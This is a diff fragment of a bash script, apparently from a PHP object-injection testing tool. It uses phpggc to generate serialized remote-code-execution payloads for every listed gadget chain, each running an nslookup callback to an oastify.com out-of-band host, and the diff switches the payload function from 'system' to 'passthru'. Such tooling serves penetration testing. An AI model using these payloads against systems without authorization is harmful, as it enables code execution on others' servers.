@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # based on https://gist.github.com/honoki/029425e61e829a9344558c8587c29f0f#file-phpggc-generate-payloads-sh
-function="system"
+function="passthru"
 command="nslookup poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com"
 options="-s"
 ~/phpggc/phpggc -l | /bin/grep RCE | cut -d' ' -f1 | xargs -L 1 ~/phpggc/phpggc -i | /bin/grep 'phpggc ' --line-buffered |
